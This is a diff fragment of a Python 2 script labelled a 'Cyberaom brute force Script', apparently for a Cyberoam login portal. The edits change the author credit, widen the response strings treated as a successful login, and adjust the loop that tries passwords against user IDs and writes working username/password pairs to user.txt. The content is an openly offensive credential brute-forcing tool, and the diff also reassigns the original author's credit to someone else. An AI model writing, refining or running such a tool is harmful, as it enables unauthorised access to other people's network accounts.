@@ -1,4 +1,4 @@
-__author__ = 'Xplore'
+__author__ = 'Saumyakanta Sahoo'
 # Cyberaom brute force Script
 
 import urllib
@@ -15,8 +15,8 @@ def countdown(num):
         sys.stdout.write(str(i%10)+'\r')
         sys.stdout.flush()
         
-print 'MADE BY - "XPLORE" '
-countdown(5)        
+print 'MADE BY - "Saumyakanta Sahoo" '
+countdown(3)        
 
 userid=[]
 test=[]
@@ -53,7 +53,9 @@ def sendLoginRequest(username, password):
         print response
         if 'successfully' in response:
             return True
-        elif 'limit' in response:
+        elif 'Limit' in response:
+            return True
+        elif 'Maximum' in response:
             return True
         elif 'data' in response:
             return True
@@ -80,6 +82,7 @@ for o in userid:
             sendLogoutRequest(str(o))
             with open("user.txt","a") as myfile:
                 myfile.write(str(o)+" "+str(l)+'\n')
+                break
             break
             
          
